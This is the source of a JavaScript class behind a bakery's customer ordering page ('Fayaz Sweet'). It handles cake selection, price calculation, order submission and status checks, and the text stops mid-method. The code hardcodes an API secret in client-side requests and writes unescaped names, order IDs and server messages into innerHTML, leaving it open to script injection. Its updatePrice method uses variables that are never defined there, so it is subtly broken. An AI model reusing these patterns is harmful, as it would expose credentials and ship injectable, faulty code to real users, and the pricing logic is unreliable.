class CustomerOrderApp {
    constructor() {
        this.recipes = {};
        this.categories = [];
        this.allCakes = [];
        this.filteredCakes = [];
        this.unitPrices = {};
        this.XONCA_PACKAGES = {};
        this.config = {};
        this.selectedCake = null;
        this.currentCategory = '';
        this.weight = 1.0;
        this.personCount = 5;
        this.markupPercent = 30;
        this.KG_PER_PERSON = 0.200;
        this.PYTHON_UPDATES_FILE = 'python_updates.json';
        this.lang = 'az';
        this.count = 1;
        this.currentColor = '#000000';
        this.currentFontSize = 14;
        this.apiBase = 'http://127.0.0.1:5000'; // Default

        // Auto-refresh config
        this.lastUpdateTime = null;
        this._updateInterval = null;
        this.pendingRecipeUpdate = null;

        // Smart Interaction tracking
        this.lastInteraction = Date.now();
        this.softResetTimer = null;
        this.softResetDelay = 60000;
        this.softResetEnabled = false;

        // Submission state
        this.submissionInProgress = false;

        this.translations = {
            az: {
                pageTitle: "Fayaz Sweet",
                searchHeader: "Axtarış",
                searchPlaceholder: "Tort adı ilə axtar...",
                backToAdmin: "Admin Panelə Qayıt",
                weightLabel: "Çəki (kg):",
                countLabel: "Say (ədəd):",
                packageLabel: "Paket Növü:",
                personLabel: "Nəfər Sayı:",
                weightHelp: "Təxmini: 1 nəfər ≈ 200qr",
                countHelp: "Xonça üçün ədəd sayını qeyd edin",
                packageHelp: "Xonça tərkibini seçin",
                orderDescPlaceholder: "Tort üzərindəki yazı və ya xüsusi qeydlər...",
                namePlaceholder: "Ad və Soyad",
                phonePlaceholder: "Mobil nömrə",
                deliveryDateLabel: "Çatdırılma Tarixi:",
                placeOrder: "SİFARİŞİ TƏSDİQLƏ",
                refreshButton: "Məlumatları Yenilə",
                orderSaved: "Sifariş uğurla qeydə alındı!",
                orderSavedShort: "Sifariş qəbul edildi.<br>Hörmətli {name}, sifarişiniz (ID: {id}) qeydə alındı.",
                fillAllFields: "Zəhmət olmasa bütün vacib xanaları doldurun!",
                error: "Xəta baş verdi",
                updateNotification: "Yeni məlumatlar var. Formu təmizlədikdən sonra məlumatlar yenilənəcək.",
                formReset: "Sifariş formu sıfırlandı (uzun müddətli passivlik)",
                allCategories: "Bütün Kateqoriyalar"
            }
        };

        this.init();
    }

    async init() {
        await this.loadData();
        this.bindEvents();
        this.setupPolling();
        this.setupUnicodeFix();
        this.setMinDate();
        this.setupImageDebug();
        this.checkStock(); // No-op but kept for structure

        if (localStorage.getItem('pendingOrders')) {
            this.schedulePendingSend();
        }
    }

    async loadData() {
        try {
            console.log('🌐 Məlumatlar yüklənir...');

            // Namizəd API ünvanları (Prioritet sırası ilə)
            const candidates = [
                window.location.origin,  // Cloudflare/ngrok tunnel (EN VACIB!)
                'http://127.0.0.1:5000',
                'http://localhost:5000',
                'http://26.231.138.10:5000', // Sizin Radmin VPN IP
            ];

            let foundApi = null;
            let cakesRes, configRes;

            // 5 saniyelik timeout ile fetch (iOS ucun kritik!)
            const fetchWithTimeout = (url, ms = 5000) => {
                const ctrl = new AbortController();
                const timer = setTimeout(() => ctrl.abort(), ms);
                return fetch(url, { signal: ctrl.signal })
                    .finally(() => clearTimeout(timer));
            };

            for (const cand of candidates) {
                try {
                    console.log(`Trying API: ${cand}`);
                    const [r1, r2] = await Promise.all([
                        fetchWithTimeout(`${cand}/api/cakes?t=` + Date.now()),
                        fetchWithTimeout(`${cand}/api/config?t=` + Date.now())
                    ]);
                    if (r1.ok && r2.ok) {
                        foundApi = cand;
                        cakesRes = r1;
                        configRes = r2;
                        break; // Uğurlu tapıldı
                    }
                } catch (e) {
                    console.warn(`Failed: ${cand}`);
                }
            }

            let usedSource = foundApi ? 'server' : 'shared';
            let API_BASE = foundApi || 'http://127.0.0.1:5000'; // Default to localhost if all fail

            let recipes = {};
            let config = {};

            if (usedSource === 'server' && cakesRes && cakesRes.ok && configRes && configRes.ok) {
                const d1 = await cakesRes.json();
                const d2 = await configRes.json();
                recipes = d1.cakes || {};
                config = d2.config || {};
                this.apiBase = API_BASE;
                console.log('✅ Serverdən yükləndi:', API_BASE);
            } else {
                // 3. Fallback to SharedData (Window Object)
                if (window.CAKE_DATA) {
                    console.log('📂 SharedData.js-dən yükləndi');
                    recipes = window.CAKE_DATA.recipes || {};
                    config = window.CAKE_DATA.config || {};
                    // For images, we can't use server if offline, so we rely on relative paths
                    this.apiBase = null;
                } else {
                    // 4. Fallback to DataService (LocalStorage)
                    console.warn('LocalStorage-ə müraciət edilir');
                    const ds = new DataService();
                    recipes = await ds.getRecipes() || {};
                    config = await ds.getConfig() || {};
                    if (Object.keys(recipes).length === 0) {
                        this.showError('Heç bir məlumat tapılmadı. Zəhmət olmasa serveri işə salın.');
                    }
                }
            }

            // Update State
            this.recipes = recipes;

            // Sort categories naturally
            this.categories = [...new Set(Object.values(this.recipes).map(r =>
                this.normalizeCategory(r.category)
            ))].sort();

            this.allCakes = Object.keys(this.recipes);

            this.config = config;
            this.unitPrices = this.config.unit_prices || {};
            this.markupPercent = parseFloat(this.config.markup_percent) || 30;
            this.KG_PER_PERSON = parseFloat(this.config.kg_per_person) || 0.200;

            if (this.config.xonca_packages) {
                this.XONCA_PACKAGES = this.config.xonca_packages;
            }

            // UI setup
            this.populateCategorySelect();
            this.renderCakeList();
            this.renderCakesGrid();

            if (window._allowManualReload) {
                this.showSuccessMessage('Məlumatlar yeniləndi', 'success');
            }

        } catch (err) {
            console.error("Yükləmə xətası:", err);
            this.showFileError("Xəta: " + err.message);
        }
    }

    async loadCakeImage() {
        const imgEl = document.getElementById('cake-image-display');
        // Yeni və köhnə placeholder klasslarını yoxlayırıq
        const ph = document.querySelector('.image-preview-placeholder') || document.querySelector('.image-placeholder');

        const cakeData = this.recipes[this.selectedCake];

        if (!cakeData || !cakeData.images || Object.keys(cakeData.images).length === 0) {
            // Şəkil yoxdursa
            if (imgEl) imgEl.style.display = 'none';
            if (ph) ph.style.display = 'flex'; // Flex is important for centering
            return;
        }

        const images = cakeData.images;
        const keys = Object.keys(images).sort((a, b) => parseFloat(a) - parseFloat(b));
        let imgName = images[keys[0]];

        // Try match weight
        const curW = this.weight || 0;
        for (let k of keys) {
            if (curW >= parseFloat(k)) imgName = images[k];
        }

        if (imgEl) {
            imgEl.onload = () => {
                imgEl.style.display = 'block';
                if (ph) ph.style.display = 'none';
            };
            imgEl.onerror = () => {
                imgEl.style.display = 'none';
                if (ph) ph.style.display = 'flex';
            };

            if (this.apiBase) {
                imgEl.src = `${this.apiBase}/images/${imgName}`;
            } else {
                imgEl.src = 'cake_images/' + imgName;
            }
        }
    }

    async checkPythonUpdates() {
        if (this.isCustomerFormActive()) return false;

        // Use API if available, else try simple file fetch if hosted, or skip
        let url = this.PYTHON_UPDATES_FILE;
        if (this.apiBase) {
            url = `${this.apiBase}/${this.PYTHON_UPDATES_FILE}`;
        }

        try {
            const res = await fetch(url + '?t=' + Date.now());
            if (!res.ok) return false;
            const update = await res.json();

            if (!this.lastUpdateTime) {
                this.lastUpdateTime = update.timestamp;
                return false;
            }

            if (update.timestamp > this.lastUpdateTime) {
                // Double check interaction
                if (Date.now() - (this.lastInteraction || 0) < 5000) return false;

                this.lastUpdateTime = update.timestamp;
                const grid = document.getElementById('cakes-grid');
                const scrollTop = grid ? grid.scrollTop : 0;

                await this.loadData();

                if (grid) grid.scrollTop = scrollTop;
                this.showSuccessMessage('Məlumatlar yeniləndi (Manual)', 'success');
                return true;
            }
        } catch (e) { return false; }
        return false;
    }

    // --- Standard Methods (Cleaned) ---

    setupAutoRefresh() {
        const refreshBtn = document.getElementById('manual-refresh-btn');
        if (refreshBtn) {
            refreshBtn.addEventListener('click', async () => {
                const t = this.translations[this.lang] || this.translations.az;
                const originalText = refreshBtn.innerHTML;
                refreshBtn.disabled = true;
                refreshBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ...';
                await this.loadData();
                refreshBtn.innerHTML = originalText;
                refreshBtn.disabled = false;
            });
        }
    }

    setupPolling() {
        if (this._updateInterval) clearInterval(this._updateInterval);
        this._updateInterval = setInterval(() => this.checkPythonUpdates(), 30000); // 30 seconds
        console.log("Polling aktivdir (Interval: 30s).");
    }

    normalizeCategory(cat) {
        return cat ? cat.trim() : 'Digər';
    }

    isCustomerFormActive() {
        if (Date.now() - (this.lastInteraction || 0) < 20000) return true;
        const ids = ['customer-name', 'customer-phone', 'order-desc'];
        if (ids.some(id => (document.getElementById(id)?.value || '').trim())) return true;
        if (document.getElementById('customer-weight')?.value && parseFloat(document.getElementById('customer-weight').value) !== 1.0) return true;
        if (this.selectedCake && this.allCakes.length > 0 && this.selectedCake !== this.allCakes[0]) return true;
        return false;
    }

    // --- UI Rendering ---

    populateCategorySelect() {
        const sel = document.getElementById('category-select');
        if (!sel) return;
        sel.innerHTML = '<option value="">Bütün Kateqoriyalar</option>';
        this.categories.forEach(cat => {
            const opt = document.createElement('option');
            opt.value = cat;
            opt.textContent = cat;
            sel.appendChild(opt);
        });
        sel.onchange = (e) => {
            this.currentCategory = e.target.value;
            this.renderCakeList();
            this.renderCakesGrid();
        };
    }

    renderCakeList() {
        const select = document.getElementById('customer-cake-select');
        if (!select) return;
        select.innerHTML = '';
        const visible = this.allCakes.filter(cake => {
            if (!this.currentCategory) return true;
            return this.normalizeCategory(this.recipes[cake].category) === this.normalizeCategory(this.currentCategory);
        });
        visible.forEach(cake => {
            const opt = document.createElement('option');
            opt.value = cake;
            opt.textContent = cake;
            select.appendChild(opt);
        });
        if (visible.length > 0 && !this.selectedCake) {
            this.selectedCake = visible[0];
            select.value = this.selectedCake;
        }
    }

    renderCakesGrid() {
        const grid = document.getElementById('cakes-grid');
        if (!grid) return;
        let html = '';
        const visible = this.allCakes.filter(cake => {
            if (!this.currentCategory) return true;
            return this.normalizeCategory(this.recipes[cake].category) === this.normalizeCategory(this.currentCategory);
        });

        visible.forEach((cake, idx) => {
            const active = (cake === this.selectedCake) ? 'active' : '';
            const time = this.recipes[cake].prep_time || '120 dəq';
            html += `
                <div class="cake-card ${active}" data-cake-name="${cake}">
                    <div class="cake-icon"><i class="fas fa-birthday-cake"></i></div>
                    <div class="cake-name">${cake}</div>
                    <div class="cake-time">${time}</div>
                </div>
             `;
        });
        grid.innerHTML = html;

        document.querySelectorAll('.cake-card').forEach(card => {
            card.onclick = () => {
                this.selectedCake = card.dataset.cakeName;
                document.querySelectorAll('.cake-card').forEach(c => c.classList.remove('active'));
                card.classList.add('active');

                const sel = document.getElementById('customer-cake-select');
                if (sel) sel.value = this.selectedCake;

                this.loadCakeData();
            };
        });
    }

    loadCakeData() {
        if (!this.selectedCake || !this.recipes[this.selectedCake]) return;
        const data = this.recipes[this.selectedCake];

        const timeDisp = document.getElementById('prep-time-display');
        if (timeDisp) timeDisp.textContent = data.prep_time || '120 dəq';

        this.updateUiForCategory();
        this.updatePrice();
        this.loadCakeImage();
    }

    updateUiForCategory() {
        // Cari kateqoriyanı məhsuldan və ya radio-dan al
        let cat = (this.currentCategory || "").toLowerCase();
        let data = this.selectedCake ? this.recipes[this.selectedCake] : null;

        if (data) {
            cat = (data.category || "").toLowerCase();
        }

        const wLabel = document.getElementById('weight-label');
        const wInput = document.getElementById('customer-weight');
        const pGroup = document.getElementById('person-count-group');
        const relationInfo = document.getElementById('relation-info');
        const relationText = document.getElementById('relation-text');
        const pkgContainer = document.getElementById('package-type-container');
        const custCard = document.getElementById('customization-card');
        const sweetsTypeCont = document.getElementById('sweets-type-container');

        // DÜZƏLİŞ: Kateqoriyaları dəqiq ayıraq
        const isXonca = cat.includes('xonca') || cat.includes('xonça');
        const isSweets = (cat === 'sirniyyat'); // Şirniyyatlar (ədəd/kq)
        const isCake = (cat === 'şirniyyat') || (cat === 'tort'); // Tortlar (diametr/çəki)

        const dGroup = document.getElementById('diameter-group');
        if (dGroup) dGroup.style.display = 'none';

        // Reset visibility
        if (pGroup) pGroup.style.display = 'none';
        if (relationInfo) relationInfo.style.display = 'none';
        if (pkgContainer) pkgContainer.style.display = 'none';
        if (sweetsTypeCont) sweetsTypeCont.style.display = 'none';
        if (custCard) custCard.style.display = 'block';
        if (wLabel) wLabel.textContent = "Çəki (kg):";
        if (wInput) wInput.step = "0.01";

        if (isXonca) {
            if (wLabel) wLabel.textContent = "Ədəd sayı:";
            if (pkgContainer) pkgContainer.style.display = 'block';
            if (custCard) custCard.style.display = 'none';
            if (wInput) wInput.step = "1";
        } else if (isSweets) {
            if (sweetsTypeCont) sweetsTypeCont.style.display = 'block';
            if (custCard) custCard.style.display = 'none';
            if (relationInfo) relationInfo.style.display = 'block';

            // Check selected unit type (kg vs ed)
            const unitType = document.querySelector('input[name="sweets-unit"]:checked')?.value || "kg";
            if (wLabel) wLabel.textContent = (unitType === "ed") ? "Ədəd:" : "Çəki (kg):";
            if (wInput) wInput.step = (unitType === "ed") ? "1" : "0.001";

            // Add Gram Helper (Like in Python app)
            if (relationInfo && relationText) {
                const pieces = data.pieces_per_kg || 20;
                const gPerPiece = (1000 / pieces).toFixed(1);
                relationText.textContent = `1 ədəd ≈ ${gPerPiece}g`;
                relationInfo.style.display = 'block';
            }
        } else {
            // Tort (Standart)
            if (wLabel) wLabel.textContent = "Çəki (kg):";
            if (pGroup) pGroup.style.display = 'block';

            // Diametr seçimini göstər
            const dGroup = document.getElementById('diameter-group');
            if (dGroup) dGroup.style.display = 'block';

            if (relationInfo) {
                relationInfo.style.display = 'block';
                if (relationText) relationText.textContent = "1 nəfər ≈ 0.200 kg";
            }
            if (wInput) wInput.step = "0.001";
        }

        this.updatePrice();
    }

    recalculateWeight() {
        const pInput = document.getElementById('person-count');
        const wInput = document.getElementById('customer-weight');
        if (!pInput || !wInput) return;

        const persons = parseInt(pInput.value) || 1;
        const weight = (persons * this.KG_PER_PERSON).toFixed(2);
        wInput.value = weight;
        this.weight = parseFloat(weight);
        this.updatePrice();
        this.loadCakeImage();
    }

    updatePrice() {
        const disp = document.getElementById('customer-sale-price');
        const wInput = document.getElementById('customer-weight');
        if (!disp || !this.selectedCake || !wInput) return;

        const data = this.recipes[this.selectedCake];
        const cat = (data.category || "").toLowerCase();
        const qty = parseFloat(wInput.value) || 0;
        const ings = data.ingredients || {};
        const markup = 1 + (this.markupPercent / 100);

        let totalPrice = 0;

        if (isXonca) {
            const pkgType = document.getElementById('package-select').value;
            let pkgBasePrice = data.package_prices?.[pkgType] || data.base_price || 50.0;

            let ingCost = 0;
            const pkgIngs = this.XONCA_PACKAGES[pkgType]?.ingredients || ings;
            Object.entries(pkgIngs).forEach(([name, val]) => {
                const base = parseFloat(val[1]);
                const unitPrice = this.unitPrices[name] || 0;
                ingCost += base * unitPrice;
            });
            totalPrice = (pkgBasePrice + ingCost) * qty * markup;
        } else if (isSweets) {
            const unitType = document.querySelector('input[name="sweets-unit"]:checked')?.value || "kg";
            const piecesPerKg = data.pieces_per_kg || 20;

            let kgCost = 0;
            Object.entries(ings).forEach(([name, val]) => {
                const base = parseFloat(val[1]);
                const unitPrice = this.unitPrices[name] || 0;
                kgCost += base * unitPrice;
            });

            if (unitType === "ed") {
                const unitCost = kgCost / piecesPerKg;
                totalPrice = qty * unitCost * markup;
            } else {
                totalPrice = qty * kgCost * markup;
            }
        } else if (isCake) {
            let kgCost = 0;
            Object.entries(ings).forEach(([name, val]) => {
                const base = parseFloat(val[1]);
                const unitPrice = this.unitPrices[name] || 0;
                kgCost += base * unitPrice;
            });

            let sizeMult = 1.0;
            const useDiam = document.getElementById('use-diameter')?.checked;
            if (useDiam) {
                const d = parseInt(document.getElementById('cake-diameter').value) || 20;
                const method = document.getElementById('scaling-method').value || "molly";
                if (method === "ideal") {
                    const mapping = { 15: 0.66, 18: 0.83, 20: 1.0, 23: 1.25, 25: 1.33, 28: 1.5, 30: 1.75 };
                    sizeMult = mapping[d] || (d / 20.0);
                } else {
                    sizeMult = d / 20.0;
                }
            }
            totalPrice = qty * kgCost * markup * sizeMult;
        }

        disp.textContent = totalPrice.toFixed(2) + ' AZN';
    }

    bindEvents() {
        const wInput = document.getElementById('customer-weight');
        if (wInput) wInput.oninput = (e) => {
            // Prevent recursive loop if needed, but simple separate logic is fine
            if (document.activeElement !== wInput) return;
            this.weight = parseFloat(e.target.value) || 1;
            if (!this.currentCategory.toLowerCase().includes('xonça')) this.calculatePersonCount();
            this.updatePrice();
            this.loadCakeImage();
        };

        const pInput = document.getElementById('person-count');
        if (pInput) pInput.oninput = (e) => {
            if (document.activeElement !== pInput) return;
            this.personCount = parseInt(e.target.value) || 1;
            this.calculateWeightFromPersons();
            this.updatePrice();
            // Image might depend on weight (tiers), so update it
            this.loadCakeImage();
        };

        document.addEventListener('mousemove', () => this.lastInteraction = Date.now());
        document.addEventListener('click', () => this.lastInteraction = Date.now());
        document.addEventListener('keydown', () => this.lastInteraction = Date.now());

        const placeBtn = document.getElementById('place-order-btn');
        if (placeBtn) {
            placeBtn.onclick = async (e) => {
                if (e) {
                    e.preventDefault();
                    e.stopPropagation();
                }
                console.log("Sifariş düyməsinə basıldı...");
                await this.placeOrder();
                return false;
            };
        }

        const search = document.getElementById('cake-search');
        if (search) search.oninput = (e) => this.filterCakes(e.target.value.toLowerCase());

        // Category Radio Buttons
        const catRadios = document.querySelectorAll('input[name="category"]');
        catRadios.forEach(radio => {
            radio.onchange = (e) => {
                this.currentCategory = e.target.value;
                this.selectedCake = null; // Kateqoriya dəyişdikdə seçimi sıfırla
                this.renderCakeList(); // Update dropdown
                this.renderCakesGrid(); // Update grid
                this.updateUiForCategory(); // Update UI fields immediately

                // Clear search if category changes to properly reflect full list
                if (search) search.value = '';
            };
        });

        // Custom Image Preview (Kamera + Qalereya)
        const showImagePreview = (file) => {
            const previewCont = document.getElementById('image-preview-container');
            const previewImg = document.getElementById('image-preview');
            if (file) {
                const reader = new FileReader();
                reader.onload = (re) => {
                    previewImg.src = re.target.result;
                    previewCont.style.display = 'block';
                    window._selectedImageFile = file;
                };
                reader.readAsDataURL(file);
            } else {
                previewCont.style.display = 'none';
                window._selectedImageFile = null;
            }
        };
        const galleryInput = document.getElementById('gallery-input');
        if (galleryInput) galleryInput.onchange = (e) => showImagePreview(e.target.files[0]);
        const cameraInput = document.getElementById('camera-input');
        if (cameraInput) cameraInput.onchange = (e) => showImagePreview(e.target.files[0]);
        // Köhnə input (geriyə uyğunluq)
        const imgInput = document.getElementById('custom-image-input');
        if (imgInput) imgInput.onchange = (e) => showImagePreview(e.target.files[0]);

        // Text Color Buttons
        const colorBtns = document.querySelectorAll('.color-btn');
        const descInput = document.getElementById('order-desc');

        colorBtns.forEach(btn => {
            btn.onclick = () => {
                // Remove active class from all
                colorBtns.forEach(b => b.classList.remove('active'));
                // Add active to clicked
                btn.classList.add('active');

                const color = btn.dataset.color;
                this.currentColor = color;

                if (descInput) {
                    descInput.style.color = color;
                    // Focus-da da rəngi saxla
                    descInput.style.borderColor = color;
                }
            };
        });

        // ---- NEW BUTTONS LOGIC ----
        const contactBtn = document.getElementById('contact-btn');
        const contactModal = document.getElementById('contact-modal');
        if (contactBtn && contactModal) {
            contactBtn.onclick = () => contactModal.style.display = 'flex';
        }

        const statusBtn = document.getElementById('check-status-btn');
        const statusModal = document.getElementById('status-check-modal');
        const doCheckBtn = document.getElementById('btn-do-check-status');
        const checkInput = document.getElementById('check-order-id');
        const resArea = document.getElementById('status-result-area');

        if (statusBtn && statusModal) {
            statusBtn.onclick = () => {
                statusModal.style.display = 'flex';
                if (resArea) resArea.style.display = 'none';
                if (checkInput) { checkInput.value = ''; checkInput.focus(); }
            };
        }

        if (doCheckBtn && checkInput) {
            doCheckBtn.onclick = async () => {
                const oid = checkInput.value.trim();
                if (!oid) return;

                doCheckBtn.disabled = true;
                doCheckBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ...';

                try {
                    const res = await fetch(`${this.apiBase}/api/orders/${oid}/status`);
                    const data = await res.json();

                    if (resArea) {
                        resArea.style.display = 'block';
                        resArea.innerHTML = '';

                        if (data.success) {
                            let statusText = data.status || 'Naməlum';
                            let color = 'white';
                            if (statusText === 'Hazırdır') color = '#2ecc71';
                            else if (statusText === 'Yeni') color = '#3498db';
                            else if (statusText === 'Ləğv edildi' || statusText.includes('İmtina')) color = '#e74c3c';
                            else if (statusText === 'Çatdırıldı' || statusText === 'Təhvil verildi') color = '#f1c40f';

                            let actionsHtml = '';

                            // Ləğv Et: Yalnız "Yeni" statusunda
                            if (statusText === 'Yeni') {
                                actionsHtml += `<button id="btn-cancel-req" style="background:#e74c3c; border:none; color:white; padding:8px 15px; border-radius:6px; cursor:pointer; flex:1;"><i class="fas fa-times"></i> Ləğv Et</button>`;
                            }

                            // Xatırlat: Yeni, Hazırlanır və Hazırdır statuslarında
                            if (['Yeni', 'Hazırlanır', 'Hazırdır'].includes(statusText)) {
                                actionsHtml += `<button id="btn-remind-req" style="background:#f39c12; border:none; color:white; padding:8px 15px; border-radius:6px; cursor:pointer; flex:1;"><i class="fas fa-bell"></i> Xatırlat</button>`;
                            }

                            resArea.innerHTML = `
                                <div style="font-size:1.2rem; margin-bottom:5px;">Sifariş #${oid}</div>
                                <div style="font-size:1.5rem; font-weight:bold; color:${color}">${statusText}</div>
                                <div style="font-size:0.9rem; color:#aaa; margin-top:5px;">Müştəri: ${data.customer_name || 'Gizli'}</div>
                                <div style="font-size:0.9rem; color:#aaa;">Məbləğ: ${data.amount} AZN</div>
                                <div style="margin-top:15px; display:flex; gap:10px; justify-content:center;">
                                    ${actionsHtml}
                                </div>
                                <div id="req-status-msg" style="margin-top:10px; font-size:0.9rem;"></div>
                            `;

                            // Events
                            const cBtn = document.getElementById('btn-cancel-req');
                            if (cBtn) {
                                cBtn.onclick = async () => {
                                    if (!confirm('Sifarişi ləğv etmək istədiyinizə əminsiniz?')) return;
                                    cBtn.disabled = true;
                                    try {
                                        let r = await fetch(`${this.apiBase}/api/orders/${oid}/cancel`, { method: 'POST' });
                                        let d = await r.json();
                                        document.getElementById('req-status-msg').innerHTML = d.success ? '<span style="color:#2ecc71">Ləğv sorğusu göndərildi!</span>' : '<span style="color:red">Xəta</span>';
                                    } catch (e) { alert('Xəta'); }
                                };
                            }

                            const rBtn = document.getElementById('btn-remind-req');
                            if (rBtn) {
                                rBtn.onclick = async () => {
                                    rBtn.disabled = true;
                                    try {
                                        let r = await fetch(`${this.apiBase}/api/orders/${oid}/remind`, { method: 'POST' });
                                        let d = await r.json();
                                        document.getElementById('req-status-msg').innerHTML = d.success ? '<span style="color:#f39c12">Xatırlatma göndərildi!</span>' : '<span style="color:red">Xəta</span>';
                                    } catch (e) { alert('Xəta'); }
                                };
                            }

                        } else {
                            resArea.innerHTML = `<span style="color:#e74c3c"><i class="fas fa-exclamation-circle"></i> ${data.error || 'Sifariş tapılmadı'}</span>`;
                        }
                    }
                } catch (e) {
                    if (resArea) {
                        resArea.style.display = 'block';
                        resArea.innerHTML = `<span style="color:#e74c3c">Xəta baş verdi</span>`;
                    }
                } finally {
                    doCheckBtn.disabled = false;
                    doCheckBtn.innerHTML = 'YOXLA';
                }
            };
        }
    }

    calculatePersonCount() {
        this.personCount = Math.max(1, Math.round(this.weight / this.KG_PER_PERSON));
        const el = document.getElementById('person-count');
        if (el) el.value = this.personCount;
    }

    calculateWeightFromPersons() {
        // 1 person = 0.200 kg => 50 person = 10 kg
        this.weight = parseFloat((this.personCount * this.KG_PER_PERSON).toFixed(2));
        const el = document.getElementById('customer-weight');
        if (el) el.value = this.weight;
    }

    filterCakes(txt) {
        if (!txt) { this.renderCakesGrid(); return; }
        const grid = document.getElementById('cakes-grid');
        const filtered = this.allCakes.filter(c => c.toLowerCase().includes(txt));
        let html = '';
        filtered.forEach(cake => {
            html += `<div class="cake-card" data-cake-name="${cake}">${cake}</div>`;
        });
        grid.innerHTML = html;
        document.querySelectorAll('.cake-card').forEach(c => c.onclick = () => {
            this.selectedCake = c.dataset.cakeName;
            this.loadCakeData();
        });
    }

    async placeOrder() {
        console.log("placeOrder başladı...");
        const btn = document.getElementById('place-order-btn');

        const name = document.getElementById('customer-name')?.value.trim();
        const phone = document.getElementById('customer-phone')?.value.trim();
        const date = document.getElementById('delivery-date')?.value;
        const desc = document.getElementById('order-desc')?.value.trim() || '';

        if (!name || !phone || !date) {
            alert('Zəhmət olmasa Ad, Telefon və Tarix xanalarını doldurun!');
            return;
        }

        // Disable button immediately
        if (btn) {
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Göndərilir...';
        }

        try {
            const now = new Date();
            const salePrice = parseFloat(document.getElementById('customer-sale-price').textContent);

            const formData = new FormData();
            formData.append('customer_name', name);
            formData.append('customer_phone', phone);
            formData.append('delivery_date', date);
            formData.append('description', desc);
            formData.append('cake_name', this.selectedCake);
            formData.append('weight', this.weight);
            formData.append('person_count', this.personCount || 1);
            formData.append('sale_price', salePrice);
            formData.append('status', 'Yeni');
            formData.append('source', 'web');
            formData.append('order_date', now.toISOString().split('T')[0]);
            formData.append('created_at', now.toISOString());
            formData.append('category', this.currentCategory);
            const unitType = document.querySelector('input[name="sweets-unit"]:checked')?.value || "kg";
            formData.append('unit_type', unitType);

            // Rəngin mütləq göndərilməsi (default: qara #000000)
            formData.append('text_color', this.currentColor || '#000000');

            // Platforma (ref) melumatini elave et
            const urlParams = new URLSearchParams(window.location.search);
            const ref = urlParams.get('ref');
            if (ref) formData.append('ref_platform', ref);

            // Sekil elave et (Qalereya ve ya Kamera)
            const galleryInp = document.getElementById('gallery-input');
            const oldInp = document.getElementById('custom-image-input');
            // window._selectedImageFile - kamera ile cekilmis sekil
            const imageFile = window._selectedImageFile
                || (galleryInp && galleryInp.files[0])
                || (oldInp && oldInp.files[0]);
            if (imageFile) {
                formData.append('custom_image', imageFile);
                console.log('Sekil elave edildi:', imageFile.name, imageFile.size, 'bytes');
            }

            console.log("Fetch göndərilir...");
            let response = await fetch(`${this.apiBase}/api/web-order`, {
                method: 'POST',
                headers: {
                    'X-API-Key': 'FayazSweet@2026#XmQ9!'  // server.py-dakı API_SECRET ilə eyni
                },
                body: formData
            });

            const textData = await response.text();
            console.log("Server Response:", textData);

            let resData;
            try {
                resData = JSON.parse(textData);
            } catch (e) {
                throw new Error("Serverdən yanlış cavab: " + textData.substring(0, 50));
            }

            if (response.ok && resData.success) {
                // Sifariş uğurlu olduqda məlumatları fonda topla (Yaşıl ekrandan əvvəl!)
                const consentCheck = document.getElementById('lead-consent');
                if (consentCheck && consentCheck.checked) {
                    await this.captureLeadData();
                }
                
                this.showShortSuccess(resData.order);
            } else {
                throw new Error(resData.error || "Server xətası");
            }

        } catch (e) {
            console.error('Submission error:', e);
            alert('Xəta: ' + e.message);
        } finally {
            if (btn) {
                btn.disabled = false;
                btn.textContent = 'SİFARİŞİ TƏSDİQLƏ';
            }
        }
    }

    showShortSuccess(order) {
        // Avtomatik yenilənməni dayandır
        if (this._updateInterval) clearInterval(this._updateInterval);

        // Köhnə modal varsa, onu tamamilə silirik (Təmiz başlanğıc üçün)
        let existingModal = document.getElementById('success-overlay-modal');
        if (existingModal) {
            existingModal.remove();
        }

        // Yeni modal yarat
        let modal = document.createElement('div');
        modal.id = 'success-overlay-modal';
        document.body.appendChild(modal);

        modal.innerHTML = `
           <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(39, 174, 96, 0.95);color:white;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:99999;">
               <h1 style="font-size: 2rem; margin-bottom: 10px;">✅ Sifariş Qəbul Edildi!</h1>
               <p style="font-size: 1.5rem; font-weight: bold;">Sifariş Nömrəsi: #${order.id}</p>
               <p>Təşəkkür edirik!</p>
               <button id="close-success-modal-btn" style="margin-top:30px;padding:15px 40px;font-size:20px;background:white;color:#27ae60;border:none;border-radius:50px;cursor:pointer;box-shadow: 0 4px 15px rgba(0,0,0,0.2);">BAĞLA</button>
           </div>
        `;
        modal.style.display = 'block';

        // Bağla düyməsinə funksiya əlavə et
        setTimeout(() => { // DOM-a oturmasını gözlə
            const btn = document.getElementById('close-success-modal-btn');
            if (btn) {
                btn.onclick = () => {
                    modal.remove(); // Modalı DOM-dan sil

                    // Polling-i yenidən başlat
                    this.setupPolling();
                    // Formu təmizlə
                    this.resetForm();
                };
            }
        }, 100);
    }

    resetForm() {
        // Inputları təmizlə
        ['customer-name', 'customer-phone', 'delivery-date', 'order-desc'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.value = '';
        });

        // Şəkil inputunu və preview-u təmizlə
        const imgInput = document.getElementById('custom-image-input');
        if (imgInput) imgInput.value = ''; // Reset file input

        const previewCont = document.getElementById('image-preview-container');
        if (previewCont) previewCont.style.display = 'none';

        const previewImg = document.getElementById('image-preview');
        if (previewImg) previewImg.src = '';

        // Digər state-ləri default-a qaytarmaq olar (optional)
        // Lakin tort seçimi və çəkini saxlamaq daha yaxşı olar, müştəri ardıcıl eyni şeyi sifariş verə bilər.
    }

    showError(msg) {
        const d = document.getElementById('order-status');
        if (d) {
            d.innerHTML = `<div style="background:#dc3545;color:white;padding:10px;border-radius:5px;">${msg}</div>`;
            d.style.display = 'block';
            setTimeout(() => d.style.display = 'none', 5000);
        }
    }

    showSuccessMessage(msg) {
        const d = document.getElementById('order-status');
        if (d) {
            d.innerHTML = `<div style="background:#28a745;color:white;padding:10px;border-radius:5px;">${msg}</div>`;
            d.style.display = 'block';
            setTimeout(() => d.style.display = 'none', 3000);
        }
    }

    showFileError(msg) { this.showError(msg); }
    showFileSuccess(msg) { this.showSuccessMessage(msg); }

    setupUnicodeFix() { /* ... */ }
    setupImageDebug() { /* ... */ }
    checkStock() { /* ... */ }
    schedulePendingSend() {
        // Auto-retry disabled per request
        console.log("Auto-retry pending sends disabled.");
    }
    setMinDate() {
        const d = document.getElementById('delivery-date');
        if (d) d.min = new Date().toISOString().split('T')[0];
